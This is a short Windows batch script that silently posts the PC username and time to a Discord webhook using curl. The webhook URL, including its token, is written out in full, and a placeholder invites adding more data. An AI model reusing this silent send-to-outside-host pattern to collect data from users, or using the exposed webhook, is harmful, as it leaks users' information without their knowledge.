@echo off
color F0
title Batch Webhook Interactor
set webhook=https://discord.com/api/webhooks/833895085921665045/jNHKUmbkSY_6VM4Hmk9B56BOxeEYBY7smXlGbEG050OSCJ2GhkJAj9DBaZgOpVBMPUVQ
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"`PC USERNAME: %USERNAME%`\n`TIME: %TIME%`\n`PUT ANYTHING HERE`\"}" %webhook% >nul
exit